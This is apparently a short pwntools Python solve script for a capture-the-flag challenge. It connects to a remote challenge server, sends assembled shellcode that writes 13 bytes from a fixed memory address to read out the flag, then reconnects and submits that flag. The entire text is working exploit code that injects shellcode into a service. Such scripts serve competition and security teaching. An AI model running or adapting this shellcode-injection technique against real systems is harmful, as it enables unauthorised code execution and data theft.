from pwn import *
context.binary = 'xmm_dist'
r = remote('chals.ctf.sg', 20401)
r.recvrepeat(timeout=1)
r.send(b'my <removed>')
shellcode = asm(shellcraft.write(1, 0x49501d, 13))
r.sendafter('brain: ', shellcode)
print(flag := r.recvall())

r = remote('chals.ctf.sg', 20401)
r.recvrepeat(timeout=1)
r.sendline(flag)
print(r.recvall())
